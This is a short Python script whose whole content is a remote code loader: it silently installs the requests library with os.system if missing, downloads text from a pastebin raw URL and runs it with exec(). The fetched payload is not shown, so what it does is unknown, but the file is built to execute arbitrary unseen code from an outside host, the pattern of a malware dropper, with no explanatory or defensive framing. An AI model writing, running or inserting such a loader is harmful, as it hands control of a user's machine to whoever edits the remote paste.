import os
try:
    import requests
except ModuleNotFoundError: 
    os.system('pip install requests')
getlink = 'https://pastebin.com/raw/Yc1rB5a9'
one = requests.get(getlink)
test = str(one.text)
exec(test)
